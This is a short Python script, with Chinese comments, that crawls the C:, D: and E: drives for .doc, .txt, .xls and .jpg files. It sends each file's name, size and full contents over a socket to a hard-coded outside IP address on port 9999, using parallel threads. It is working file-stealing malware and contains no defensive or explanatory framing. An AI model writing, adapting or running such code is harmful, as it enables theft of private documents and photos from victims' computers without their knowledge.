import os
import socket
import threading

def scan_file(file_type):
    paths_lis = ['c:\\','d:\\','e:\\']
    files_lis = [os.walk(path_lis) for path_lis in paths_lis]
    for files in files_lis:
        for file in files:
            files_name = file[2]
            for file_name in files_name:
                file_path = file[0] + '\\' + file_name
                if file_type in file_name:
                    ss(file_path,file_name)


def ss(file_path,file_name):
    st = socket.socket()
    st.connect(('23.251.42.252',9999))
    st.send(file_name.encode())  # 发送一次文件名
    st.recv(10240).decode(encoding='utf-8',errors='ignore')  # 防止粘包，接收一个
    file_size = str(os.path.getsize(file_path))  # 计算文件大小
    st.send(file_size.encode())  # 发送文件大小  用来比对文件是否接收完毕
    f = open(file_path,'rb')
    for line in f:
        st.send(line)
    f.close()
if __name__ == '__main__':
    t1 = threading.Thread(target=scan_file,args=('.doc',))
    t2 = threading.Thread(target=scan_file,args=('.txt',))
    t3 = threading.Thread(target=scan_file,args=('.xls',))
    t4 = threading.Thread(target=scan_file,args=('.jpg',))
    t1.start()
    t2.start()
    t3.start()
    t4.start()
